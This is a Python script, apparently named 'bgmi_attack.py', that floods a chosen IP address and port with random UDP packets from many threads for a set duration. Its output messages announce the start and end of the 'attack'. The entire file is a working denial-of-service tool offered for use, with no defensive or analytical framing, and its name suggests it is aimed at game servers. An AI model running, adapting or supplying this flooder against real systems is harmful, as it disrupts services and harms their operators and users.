import time
import socket
import random
import threading
import sys

def run(ip, port, duration):
    data = random._urandom(1024)
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP = SOCK_DGRAM
            addr = (ip, port)
            s.sendto(data, addr)
        except Exception as e:
            print(f"[!] Error: {e}")
            s.close()

if __name__ == '__main__':
    if len(sys.argv) != 5:
        print("Usage: python3 bgmi_attack.py <target> <port> <duration> <threads>")
        sys.exit(1)

    ip = str(sys.argv[1])
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    threads = int(sys.argv[4])

    # Validate inputs
    if not (1 <= port <= 65535):
        print("Error: Port number must be between 1 and 65535.")
        sys.exit(1)
    
    if duration <= 0:
        print("Error: Duration must be a positive integer.")
        sys.exit(1)
    
    if threads <= 0:
        print("Error: Threads must be a positive integer.")
        sys.exit(1)

    print("Attack started")

    thread_list = []

    for _ in range(threads):
        th = threading.Thread(target=run, args=(ip, port, duration))
        th.start()
        thread_list.append(th)

    # Wait for all threads to finish
    for th in thread_list:
        th.join()

    print(f"Attack finished after {duration} seconds.")
    sys.exit(0)
